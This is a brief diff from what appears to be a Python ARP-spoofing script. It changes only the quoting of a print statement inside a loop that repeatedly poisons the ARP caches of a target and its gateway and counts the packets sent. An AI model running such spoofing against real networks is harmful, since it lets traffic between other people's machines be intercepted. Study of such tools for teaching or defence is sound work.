@@ -45,7 +45,7 @@ try:
         spoof(target_ip,gateway_ip)
         spoof(gateway_ip,target_ip)
         packet_count += 2
-        print('\r[+]Packets sent: ' + str(packet_count)),
+        print("\r[+]Packets sent: " + str(packet_count)),
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
